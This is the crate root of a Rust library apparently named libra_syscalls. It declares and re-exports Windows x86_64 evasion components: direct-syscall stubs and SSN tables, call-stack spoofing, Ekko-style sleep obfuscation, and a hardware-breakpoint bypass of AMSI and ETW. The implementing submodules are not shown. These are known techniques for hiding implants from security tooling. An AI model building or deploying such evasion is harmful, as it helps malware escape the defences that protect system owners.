//!
//!
//! ```ignore
//! let status = unsafe { libra_syscalls::nt_delay_execution(0, &mut delay) };
//! ```
//!

pub mod types;

// The syscall primitives below (SSN table + trampoline, stub/spoof assembly,
// ekko sleep obfuscation, hardware breakpoint ETW/AMSI bypass) are x86_64-only:
// the register contexts, ROP frames and inline assembly target the AMD64 ABI.
// On other architectures (incl. aarch64 Windows) the crate degrades to a
// no-op so the kernel still builds — callers fall back to standard APIs.
#[cfg(all(windows, target_arch = "x86_64"))]
mod extract;
#[cfg(all(windows, target_arch = "x86_64"))]
mod ffi;
#[cfg(all(windows, target_arch = "x86_64"))]
mod hwbp;
#[cfg(all(windows, target_arch = "x86_64"))]
mod invoke;
#[cfg(all(windows, target_arch = "x86_64"))]
mod pe;
#[cfg(all(windows, target_arch = "x86_64"))]
mod sleepobf;
#[cfg(all(windows, target_arch = "x86_64"))]
mod spoof;
#[cfg(all(windows, target_arch = "x86_64"))]
mod stub;
#[cfg(all(windows, target_arch = "x86_64"))]
mod table;

#[cfg(all(windows, target_arch = "x86_64"))]
pub use extract::{probe_stub, StubProbe};
#[cfg(all(windows, target_arch = "x86_64"))]
pub use hwbp::install_amsi_etw_bypass;
#[cfg(all(windows, target_arch = "x86_64"))]
pub use invoke::*;
#[cfg(all(windows, target_arch = "x86_64"))]
pub use sleepobf::{obfuscated_sleep, Context};
#[cfg(all(windows, target_arch = "x86_64"))]
pub use spoof::{init_spoof, spoof_call, SpoofFrame};
#[cfg(all(windows, target_arch = "x86_64"))]
pub use table::SyscallTable;
pub use types::*;

///
#[cfg(all(windows, target_arch = "x86_64"))]
pub fn init() -> Result<(), &'static str> {
    let table = SyscallTable::build()?;
    if table.trampoline == 0 {
        return Err("no syscall trampoline found");
    }
    stub::write_ssn(&table)?;
    stub::LIBRA_TRAMPOLINE.store(
        table.trampoline as u64,
        core::sync::atomic::Ordering::Relaxed,
    );
    let _ = spoof::init_spoof();
    Ok(())
}

/// No-op when the x86_64 syscall primitives are unavailable (non-Windows or
/// non-x86_64 Windows).
#[cfg(not(all(windows, target_arch = "x86_64")))]
pub fn init() -> Result<(), &'static str> {
    Ok(())
}
